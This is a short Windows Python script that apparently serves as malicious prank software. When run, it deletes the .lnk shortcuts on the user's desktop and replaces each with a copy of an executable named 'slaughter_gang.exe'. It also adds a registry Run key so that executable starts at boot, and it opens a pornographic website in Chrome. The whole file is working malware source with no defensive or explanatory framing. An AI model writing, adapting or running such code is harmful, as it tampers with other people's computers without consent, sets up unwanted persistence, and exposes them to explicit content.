import os
import winreg
import subprocess

def replace_shortcuts():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    exe_path = os.path.join(desktop_path, "slaughter_gang.exe")

    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as reg_key:
        desktop_folder_path = winreg.QueryValueEx(reg_key, "Desktop")[0]

    for root, dirs, files in os.walk(desktop_folder_path):
        for file in files:
            if file.endswith(".lnk"):
                shortcut_path = os.path.join(root, file)
                os.remove(shortcut_path)
                os.system(f'copy "{exe_path}" "{shortcut_path}"')

def run_on_startup():
    exe_path = "C:\\path\\to\\slaughter_gang.exe"  # Replace with the actual path to your executable

    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE) as reg_key:
        winreg.SetValueEx(reg_key, "SlaughterGang", 0, winreg.REG_SZ, exe_path)

def open_pornhub():
    subprocess.Popen(["C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "https://www.pornhub.com/"])

replace_shortcuts()
run_on_startup()
open_pornhub()
